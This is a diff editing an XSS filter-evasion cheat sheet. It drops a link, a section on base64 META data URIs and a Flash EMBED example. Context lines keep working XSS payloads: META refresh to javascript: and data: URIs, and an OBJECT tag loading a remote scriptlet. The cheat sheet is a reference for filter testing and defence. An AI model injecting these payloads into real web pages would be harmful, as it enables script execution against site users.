@@ -346,8 +346,6 @@ Method doesn't require using any variants of `javascript:` or `<SCRIPT...` to ac
 
 It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.
 
-The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).
-
 1. `FSCommand()` (attacker can use this when executed from within an embedded Flash object)
 2. `onAbort()` (when user aborts the loading of an image)
 3. `onActivate()` (when object is set as the active element)
@@ -581,10 +579,6 @@ The odd thing about meta refresh is that it doesn't send a referrer in the heade
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 ```
 
-### META using Data
-
-Directive URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details or go here or here to encode your own. You can also use the XSS [calculator](http://ha.ckers.org/xsscalc.html) below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:
-
 ```html
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 ```
@@ -692,17 +686,6 @@ If they allow objects, you can also inject virus payloads to infect the users, e
 ```html
 <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
 ```
-
-## EMBED a Flash Movie That Contains XSS
-
-Click here for a demo: [http://ha.ckers.org/xss.swf](http://ha.ckers.org/xss.swf)
-
-```html
-<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
-```
-
-If you add the attributes `allowScriptAccess="never"` and `allownetworking="internal"` it can mitigate
-this risk (thank you to Jonathan Vanasco for the info).
 
 ## EMBED SVG Which Contains XSS Vector
 
